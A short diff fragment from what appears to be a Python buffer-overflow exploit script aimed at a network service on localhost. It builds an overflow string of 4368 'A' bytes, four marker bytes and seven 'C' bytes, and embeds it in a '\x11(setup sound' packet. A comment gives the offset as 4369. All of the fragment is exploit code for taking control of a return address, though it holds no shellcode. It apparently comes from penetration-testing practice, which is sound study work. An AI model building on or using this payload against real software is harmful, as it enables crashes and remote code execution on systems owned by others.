@@ -7,7 +7,7 @@ host = "127.0.0.1"
 #the offset was 4369
 
 
-crash="\x41" * 4368 + "B" * 4 + "C" * 7
+crash="\x41" * 4368 + "\x42" * 4 + "C" * 7
 
 buffer = "\x11(setup sound " + crash + "\x90\x00#"
 
